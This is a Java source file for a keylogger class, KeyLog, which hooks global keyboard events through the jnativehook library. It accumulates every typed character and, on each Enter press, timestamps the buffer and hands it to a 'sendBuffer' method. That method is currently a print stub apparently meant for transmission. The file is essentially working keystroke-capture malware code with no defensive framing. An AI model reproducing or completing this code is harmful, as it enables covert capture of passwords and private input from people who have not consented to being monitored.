package common;

import java.text.SimpleDateFormat;
import java.util.Date;

import java.util.logging.Logger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import common.Tracer;

public class KeyLog implements NativeKeyListener {
	
	@SuppressWarnings("unused")
	private static final Logger LOGGER = Tracer.getLogger(KeyLog.class );
	
	private static String buffer = new String();
	public static SimpleDateFormat sdf = new SimpleDateFormat("YYYY-MM-dd HH:mm:ss.SSS");
	
    public void nativeKeyPressed(NativeKeyEvent e) {
    	if(e.getKeyCode() == NativeKeyEvent.VC_ENTER || e.getKeyCode() == NativeKeyEvent.VC_KP_ENTER){
    		
    		String d = sdf.format(new Date());
    		sendBuffer(buffer+"/"+d);
    		buffer = "";
    		
    	}
    }

    private void sendBuffer(String buffer2) {
    	System.out.println("BUFFER: "+buffer2);
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    	
    	buffer = buffer + e.getKeyChar();
    	
    	
    }

}